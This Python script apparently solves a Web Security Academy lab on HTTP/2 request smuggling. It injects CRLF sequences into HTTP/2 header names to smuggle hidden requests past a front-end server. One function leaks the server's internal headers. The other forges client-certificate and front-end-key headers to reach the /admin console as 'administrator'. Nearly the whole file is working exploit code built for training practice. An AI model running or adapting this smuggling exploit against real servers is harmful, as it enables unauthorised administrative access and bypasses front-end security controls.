import re
import urllib.parse
import http.client
import ssl

import h2.connection
import h2.events
import certifi
import socket

LAB_ID = "???"


def list_internal_headers(
) -> [str, str]:
    method, path = 'POST', f'/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = [
        (':method', method),
        (':path', path),
        (':authority', host),
        (':scheme', 'https'),
        ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'),
        ('accept-language', 'en-US,en;q=0.5'),
        ('content-type', 'application/x-www-form-urlencoded'),
    ]
    smuggled = f"""content-length: 114

search=""" \
        .replace("\n", "\r\n")
    headers.append((f"evil: xxx\r\n{smuggled}", f"xxx"))

    body = "x=1"

    # generic socket and ssl configuration
    socket.setdefaulttimeout(15)
    ctx = ssl.create_default_context(cafile=certifi.where())
    ctx.set_alpn_protocols(['h2'])

    # open a socket to the server and initiate TLS/SSL
    s = socket.create_connection((host, port))
    s = ctx.wrap_socket(s, server_hostname=host)

    c = h2.connection.H2Connection()
    c.initiate_connection()
    s.sendall(c.data_to_send())

    c.send_headers(1, headers, end_stream=False)
    c.send_data(1, body.encode(), end_stream=True)
    s.sendall(c.data_to_send())

    response_body = b''
    response_stream_ended = False
    status = None
    while not response_stream_ended:
        # read raw data from the socket
        data = s.recv(65536 * 1024)
        if not data:
            break

        # feed raw data into h2, and process resulting events
        events = c.receive_data(data)
        for event in events:
            print(event)
            if isinstance(event, h2.events.ResponseReceived):
                status = next(header[1] for header in event.headers if header[0] == b':status').decode()
            if isinstance(event, h2.events.DataReceived):
                # update flow control so the server doesn't starve us
                c.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                # more response body data received
                response_body += event.data
            if isinstance(event, h2.events.StreamEnded):
                # response body completed, let's exit the loop
                response_stream_ended = True
                break

    # tell the server we are closing the h2 connection
    c.close_connection()
    s.sendall(c.data_to_send())

    # close the socket
    s.close()
    return response_body.decode('utf-8'), status


def smuggle_head(
        internal_headers: list[[str, str]],
) -> [str, str]:
    method, path = 'HEAD', f'/post'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = [
        (':method', method),
        (':path', path),
        (':authority', host),
        (':scheme', 'http'),
        ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'),
        ('accept-language', 'en-US,en;q=0.5'),
    ]
    smuggled = f"""GET /admin HTTP/1.1
Host: {host}""".replace('\n', '\r\n')
    for name, value in internal_headers:
        smuggled = smuggled + f"\r\n{name}: {value}"
    smuggled = smuggled + "\r\n\r\n"
    print(urllib.parse.quote_plus(f"foo: xxx\r\n\r\n{smuggled}"))
    headers.append((f"foo: xxx\r\n\r\n{smuggled}", "xxx"))

    # generic socket and ssl configuration
    socket.setdefaulttimeout(15)
    ctx = ssl.create_default_context(cafile=certifi.where())
    ctx.set_alpn_protocols(['h2'])

    # open a socket to the server and initiate TLS/SSL
    s = socket.create_connection((host, port))
    s = ctx.wrap_socket(s, server_hostname=host)

    c = h2.connection.H2Connection()
    c.initiate_connection()
    s.sendall(c.data_to_send())

    c.send_headers(1, headers, end_stream=True)
    s.sendall(c.data_to_send())

    response_body = b''
    response_stream_ended = False
    status = None
    while not response_stream_ended:
        # read raw data from the socket
        data = s.recv(65536 * 1024)
        if not data:
            break

        # feed raw data into h2, and process resulting events
        events = c.receive_data(data)
        for event in events:
            print(event)
            if isinstance(event, h2.events.ResponseReceived):
                status = next(header[1] for header in event.headers if header[0] == b':status').decode()
            if isinstance(event, h2.events.DataReceived):
                # update flow control so the server doesn't starve us
                c.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                # more response body data received
                response_body += event.data
            if isinstance(event, h2.events.StreamEnded):
                # response body completed, let's exit the loop
                response_stream_ended = True
                break

    # tell the server we are closing the h2 connection
    c.close_connection()
    s.sendall(c.data_to_send())

    # close the socket
    s.close()
    return response_body.decode('utf-8'), status


internal_headers = [
    ('X-SSL-VERIFIED', '1'),
    ('X-SSL-CLIENT-CN', 'administrator'),
    ('X-FRONTEND-KEY', '???'), # change it
]
# internal_headers = None

if internal_headers is None:
    print("listing internal headers (manipulate content-length in the method)")
    body, status = list_internal_headers()
    print(f"smuggling response status: {status}")
    print("response body:")
    print(body)

if internal_headers is not None:
    print("getting admin console")
    body, status = smuggle_head(internal_headers)
    print(f"smuggling response status: {status}")
    print("response body:")
    print(body)
